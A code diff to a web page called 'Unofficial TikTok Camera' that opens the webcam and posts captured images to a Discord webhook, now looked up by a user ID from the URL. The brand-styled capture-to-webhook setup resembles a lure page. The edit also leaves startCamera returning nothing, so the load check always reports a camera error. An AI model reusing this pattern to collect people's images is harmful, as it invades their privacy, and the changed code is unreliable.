@@ -27,7 +27,7 @@
             border-image: linear-gradient(to right, #f0f, #0ff, #f0f) 1;
             border-radius: 20px;
             box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
-            opacity: 0.5;  /* Adjust this value (0 to 1) for desired opacity */
+            opacity: 0.5;
         }
         button {
             margin-top: 20px;
@@ -48,20 +48,6 @@
         button:active {
             transform: scale(0.95);
         }
-        #loadingIndicator {
-            display: none;
-            margin: 20px auto;
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(255, 255, 255, 0.2);
-            border-top: 5px solid #fff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
         #errorMessage {
             color: red;
             font-size: 1.2rem;
@@ -72,7 +58,6 @@
 <body>
     <h1>Unofficial TikTok Camera</h1>
     <video id="webcam" autoplay></video>
-    <div id="loadingIndicator"></div>
     <button id="captureButton">Capture</button>
     <p id="message"></p>
     <p id="errorMessage"></p>
@@ -84,40 +69,41 @@
         const message = document.getElementById('message');
         const errorMessage = document.getElementById('errorMessage');
         const canvas = document.getElementById('canvas');
-        const loadingIndicator = document.getElementById('loadingIndicator');
         const ctx = canvas.getContext('2d');
 
         let currentStream = null; // Hold the stream globally
-
-        // Retrieve the user's webhook URL from localStorage
-        const DISCORD_WEBHOOK_URL = localStorage.getItem('userWebhook');
-
-        if (!DISCORD_WEBHOOK_URL) {
-            message.textContent = "No webhook URL found. Please go back to the homepage to enter it.";
-            captureButton.disabled = true;
-            return;
-        }
+        let DISCORD_WEBHOOK_URL = null; // Will be set after ID validation
 
         // Retrieve user ID from URL parameters
         const urlParams = new URLSearchParams(window.location.search);
         const userID = urlParams.get('userID');
 
-        // Display user ID (for debugging purposes)
-        console.log("User ID: " + userID);
+        if (!userID) {
+            errorMessage.textContent = "No user ID found.";
+            errorMessage.style.display = 'block';
+            return;
+        }
 
-        // Function to start the camera with specified facingMode
+        // Check if the user ID exists in localStorage
+        DISCORD_WEBHOOK_URL = localStorage.getItem(userID);
+
+        if (!DISCORD_WEBHOOK_URL) {
+            errorMessage.textContent = "Invalid or non-existing User ID.";
+            errorMessage.style.display = 'block';
+            return;
+        }
+
+        // Function to start the camera
         async function startCamera(facingMode) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: facingMode },
                 });
                 video.srcObject = stream;
-                currentStream = stream; // Store the current stream
-                return stream;
+                currentStream = stream;
             } catch (err) {
                 errorMessage.textContent = 'Error accessing webcam: ' + err.message;
                 errorMessage.style.display = 'block';
-                captureButton.disabled = true;
                 return null;
             }
         }
@@ -163,27 +149,20 @@
             });
         }
 
-        // Main event listener for capturing and sending images
         captureButton.addEventListener('click', async () => {
             message.textContent = '';
-            loadingIndicator.style.display = 'block';
-
             try {
                 await captureAndSendImage();
                 message.textContent = "Capture successful! Check Discord.";
             } catch (err) {
                 message.textContent = err;
             }
-
-            loadingIndicator.style.display = 'none';
         });
 
         // Initialize the camera on page load
         window.addEventListener('load', async () => {
             const stream = await startCamera('user');
-            if (stream) {
-                console.log("Camera is ready.");
-            } else {
+            if (!stream) {
                 errorMessage.textContent = "Unable to access camera.";
                 errorMessage.style.display = 'block';
             }
